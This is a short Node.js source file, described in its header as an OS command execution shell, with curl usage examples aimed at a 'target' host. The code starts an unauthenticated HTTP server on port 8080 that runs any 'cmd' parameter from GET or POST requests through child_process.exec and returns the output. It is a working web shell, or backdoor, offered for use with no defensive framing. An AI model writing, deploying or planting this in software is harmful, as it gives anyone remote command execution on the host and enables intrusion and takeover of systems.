/*
Description
-----------
An OS command execution shell implementation in Node.js

Usage
-----
In the server run: node os_shell.js
From the client: curl -X POST -d "cmd=id" http://target:8080
                 curl http://target:8080?cmd=id
				 
*/

const{exec}  = require('child_process');
url = require('url'),
http = require('http'),
qs = require('querystring');

function exec_cmd(strcmd,objresponse)
{
    results='';
	exec(strcmd, (err, results, stderr) => {           
		if (err) {            
			objresponse.end(`${stderr}`);
		}
		else
		{           
			objresponse.end(`${results}`);
		}
	});        
}

var server = http.createServer(
    function (req, res) {
        res.writeHead(200, {'Content-Type': 'text/html'});
        var cmdstr='';      
        if (req.method == 'POST') {
			var body = '';                
			req.on('data', function (data) {                       
                body += data;
            });
            req.on('end',function() {                         
				var post_params =  qs.parse(body);
				cmdstr=post_params.cmd;    
				exec_cmd(cmdstr,res);		           
            });            
        }
        else if(req.method == 'GET') {
            var strurl = url.parse(req.url,true);
            cmdstr=strurl.query.cmd;
            exec_cmd(cmdstr,res);
        }
    }
);
server.listen(8080);
